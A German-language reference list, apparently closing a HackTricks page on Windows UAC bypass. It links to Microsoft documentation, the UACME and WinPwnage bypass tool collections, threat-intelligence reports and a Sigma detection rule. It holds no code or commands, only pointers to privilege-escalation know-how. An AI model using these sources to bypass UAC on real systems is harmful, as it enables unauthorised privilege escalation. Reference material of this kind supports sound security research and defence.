- [2] [Microsoft Docs – Funktionsweise der Benutzerkontensteuerung](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC bypass-Techniken](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI setzt KI zur Generierung von PowerShell-Backdoors ein](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day-Exploitation gegen südostasiatische Regierungsziele](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehen des Windows-Administrator-Schutzes](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass mit der SilentCleanup-Aufgabe](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
